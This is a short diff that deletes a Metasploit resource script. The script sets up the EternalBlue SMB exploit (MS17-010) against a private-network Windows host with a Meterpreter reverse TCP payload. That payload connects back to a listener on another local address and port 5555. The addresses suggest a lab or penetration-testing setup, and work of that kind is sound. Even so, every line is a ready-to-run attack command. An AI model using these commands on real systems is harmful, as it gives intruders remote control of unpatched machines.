@@ -1,7 +1,0 @@
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.142.230
-set TARGET 0
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.142.253
-set LPORT 5555
-exploit -j
